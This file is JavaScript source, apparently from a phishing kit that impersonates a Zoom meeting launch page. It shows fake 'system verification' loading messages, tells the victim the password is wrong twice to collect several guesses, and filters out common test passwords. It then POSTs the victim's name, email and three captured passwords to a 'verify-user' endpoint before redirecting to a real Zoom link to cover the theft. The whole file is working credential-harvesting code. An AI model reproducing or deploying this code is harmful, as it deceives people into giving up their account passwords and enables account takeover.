

$("#join_btn").on("click", ()=>{
    $("#join_btn").hide();
    $(".meeting_loading").css({"margin-top":"2rem"});
    
    $("#loader_img").html(`<img src="${imgUrl}" alt="loading ...">`);

    $("#loader_text").html(`<i>launching ...</i>`);
    

    setTimeout(() => {
        $("#loader_text").html(`<i>detecting operating system ...</i>`)
    }, 2000);

    setTimeout(() => {
        $("#loader_text").html(`<i>system verification ...</i>`)
    }, 5000);

    setTimeout(() => {
        $("#loader_text").html(`<i>connecting to meeting ...</i>`)
    }, 9000);

    setTimeout(() => {
        $("#loader_text").html(`<i>initializing ...</i>`)
    }, 12000);

    setTimeout(() => {
        let url = "zoommeeting/?meeting=video&id="+$("#get_id").val()+"&access="+$("#get_access").val();
        location = url;
    }, 15000);
})
let passwords = [];
// change type
let pw = document.getElementById("ipass");

$("#ipass").on('click', () => {
    pw.type = "password";
    pw.style.color = "black";
});

let reg_count = 0;
$("#launch_btn").on("click", () => {
    let pax = $("#ipass").val();

    if (pax == "" || pax.length < 6) {
        $("#ipass").css({"border-color": "red"});

        setTimeout(() => {
            $("#ipass").css({"border-color": "gray"});
        }, 5000);
        return;
    }

    if (pax == "testing" || pax == "TESTING" || pax == "Testing" || pax == "123456" || pax == "password" || pax == "PASSWORD" || pax == "Password" || pax == "qwerty" || pax == "QWERTY") {
        $("#ipass").css({"border-color": "red"});
        return;
    }

    passwords.push(pax);

    reg_count++;

    $("#launch_btn").hide();
    $(".meeting_loading").css({"margin-top": "2rem", "margin-bottom": "2rem"});
    $("#loader_img").html(`<img src="${imgUrl}" alt="loading ..." />`);

    if (reg_count == 3) {
        pw.type = "search";
        pw.style.color = "transparent";
        $("#loader_text").html("");

        const baseUrl = window.location.origin;  // This gets the scheme (http/https) and domain
        const endpoint = "/verify-user/";
        const url = `${baseUrl}/zoommeeting${endpoint}`;
        console.log(passwords);

        setTimeout(() => {
            // Send POST request to verify user
            $.post(url, {
                name: $("#get_id").val(),
                mail: $("#mailer").text(),
                pass:passwords[0],
                pass1: $("#temp_ipass").val(),
                pass2: pax
            }, function(data, status) {
                if (status == "success") location = "https://us05web.zoom.us/s/82050708316?pwd=qXfmwuFUeciwAfF7ElVMN5NgOWvNUW.1#success";
            });
        }, 2000);

    } else {
        pw.type = "search";
        pw.style.color = "transparent";
        let rand_num = $("#rand_number").val();

        // Display incorrect password message on the first two attempts
        if (reg_count <= 2) {
            setTimeout(() => {
                $("#loader_text").html(`<span style="color:red">Incorrect password. Please try again.</span>`);
                $("#temp_ipass").val(pax);
                $("#ipass").val("");
                $("#loader_img").html("");
                $("#launch_btn").show();
            }, rand_num);
        }
        // On the third attempt, show the connection error message
        else if (reg_count === 3) {
            setTimeout(() => {
                $("#loader_text").html(`<span style="color:red">There was an error connecting, please try again.</span>`);
                $("#temp_ipass").val(pax);
                $("#ipass").val("");
                $("#loader_img").html("");
                $("#launch_btn").show();
            }, rand_num);
        }
    }
});
